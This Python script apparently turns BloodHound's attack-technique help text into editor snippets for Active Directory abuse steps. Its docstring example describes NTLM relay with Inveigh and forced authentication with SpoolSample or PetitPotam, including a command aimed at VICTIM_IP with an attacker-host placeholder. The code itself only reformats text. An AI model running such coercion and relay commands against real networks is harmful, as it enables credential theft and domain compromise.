# /// script
# requires-python = ">=3.10"
# dependencies = []
# ///

import json


'''
Example of technique_props structure:
{
    "key": null,
    "ref": null,
    "props": {
        "children": [
            {
                "type": {
                    "propTypes": {}
                },
                "key": null,
                "ref": null,
                "props": {
                    "variant": "body2",
                    "children": "1: Start the Relay Server The NTLM relay can be executed with Inveigh."
                },
                "_owner": null,
                "_store": {}
            },
            {
                "type": {
                    "propTypes": {}
                },
                "key": null,
                "ref": null,
                "props": {
                    "variant": "body2",
                    "children": [
                        "2: Coerce the Target Computer Several coercion methods are documented here:",
                        " ",
                        {
                            "type": "a",
                            "key": null,
                            "ref": null,
                            "props": {
                                "href": "https://github.com/p0dalirius/windows-coerced-authentication-methods",
                                "children": "Windows Coerced Authentication Methods"
                            },
                            "_owner": null,
                            "_store": {}
                        },
                        ". Examples of tools include:",
                        {
                            "type": "a",
                            "key": null,
                            "ref": null,
                            "props": {
                                "href": "https://github.com/leechristensen/SpoolSample",
                                "children": "SpoolSample"
                            },
                            "_owner": null,
                            "_store": {}
                        },
                        {
                            "type": "a",
                            "key": null,
                            "ref": null,
                            "props": {
                                "href": "https://github.com/topotam/PetitPotam",
                                "children": "PetitPotam"
                            },
                            "_owner": null,
                            "_store": {}
                        },
                        "To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe \"VICTIM_IP\" \"ATTACKER_NETBIOS@PORT/file.txt\""
                    ]
                },
                "_owner": null,
                "_store": {}
            }
        ]
    },
    "_owner": null,
    "_store": {}
}
'''



def deep_process_props(props):
    # 递归处理 props 以及其中的 props children 
    # 将内容转换为 markdown 格式
    if isinstance(props, dict):
        if "props" in props:
            # operating all kinds of elements
            if "type" in props.keys() and props["type"] == "a":
                return f"[{props['props']['children']}]({props['props']['href']})"
            if "href" in props["props"].keys() and props["props"]["href"] != "":
                return f"[{props['props']['children']}]({props['props']['href']})"
            if "type" in props.keys() and props["type"] == "b":
                return f"- {props['props']['children']}"
            if "type" in props.keys() and props["type"] == "br":
                return "\n"
            if "component" in props["props"].keys() and props["props"]["component"] == "pre":
                return f"\n```sh\n{props['props']['children']}\n```"
            if "component" in props["props"].keys() and props["props"]["component"] == "code":
                return f"`{props['props']['children']}`"
            if "component" in props["props"].keys() and props["props"]["component"] == "span":
                return f"- {props['props']['children']}"
            return deep_process_props(props["props"])
        if "children" in props:
            if isinstance(props["children"], str):
                # 处理字符串类型的 children
                return props["children"]
            elif isinstance(props["children"], list):
                return [deep_process_props(child) for child in props["children"]]
            elif isinstance(props["children"], dict):
                print("dict detected", json.dumps(props["children"], ensure_ascii=False))
                return deep_process_props(props["children"])
        else:
            return props
    elif isinstance(props, str):
        return f"{props}"
    elif isinstance(props, list):
        return [deep_process_props(item) for item in props]
    

def process_dict_to_string(data):
    # 将递归数组转换为字符串列表
    if isinstance(data, str):
        return data
    elif isinstance(data, list):
        print("list detected", data)
        string = ""
        for i in data:
            string += process_dict_to_string(i)
        return string
    elif isinstance(data, dict):
        print("dict detected", data)
        return ""


def parse_abuse(name, platform, technique_props, desc):
    print(f"detecting {platform} abuse for {name}...")
    print(json.dumps(technique_props, indent=4, ensure_ascii=False))
    data = deep_process_props(technique_props)
    body = [f"To Abuse '{name}' over {platform}: "]
    print(f"data: {data}")
    # parse data to string list body
    if isinstance(data, str):
        body.append(data)
    elif isinstance(data, list):
        for item in data:
            curent_str = process_dict_to_string(item)
            for line in curent_str.split("\n"):
                if line.strip() != "":
                    body.append(line.strip())
    print(f"body: {body}")
    return {
        f"{name} {platform} abuse (bloodhound)": {
            "description": desc.replace("$controlled_object_type", "").replace("$CONTROLLED", "controlled object").replace("$target_object_type", "").replace("$TARGET", "target object"),
            "prefix": f"{name}",
            "body": body,
        }
    }


def parse_technique(technique):
    technique_name = technique["technique"]
    linux_abuse = technique.get("linux", {})
    windows_abuse = technique.get("windows", {})
    common = technique.get("abuse", {})
    print(f"Parsing {technique_name}...")
    snippets = {}
    
    desc = process_dict_to_string(deep_process_props(technique.get("general", {})))
    print(f"Technique description: {desc}")
    
    if linux_abuse != {}:
        snippets.update(parse_abuse(technique_name, "linux", linux_abuse, desc))
    else:
        print(f"Skipping {technique_name} due to missing linux abuse info")
    if windows_abuse != {}:
        snippets.update(parse_abuse(technique_name, "windows", windows_abuse, desc))
    else:
        print(f"Skipping {technique_name} due to missing windows abuse info")
    if common != {}:
        snippets.update(parse_abuse(technique_name, "common", common, desc))
        print("Common",common)
    else:
        print(f"Skipping {technique_name} due to missing common abuse info")
    return snippets


def main():
    output = open("blood.json", "w", encoding="utf-8")
    output_data = {}
    
    input_file = open("./dump/result.json", "r", encoding="utf-8")
    input_data = json.load(input_file)
    
    for technique in input_data:
        output_data |= parse_technique(technique)

    json.dump(output_data, output, ensure_ascii=False, indent=4)
    output.close()
    input_file.close()

if __name__ == "__main__":
    main()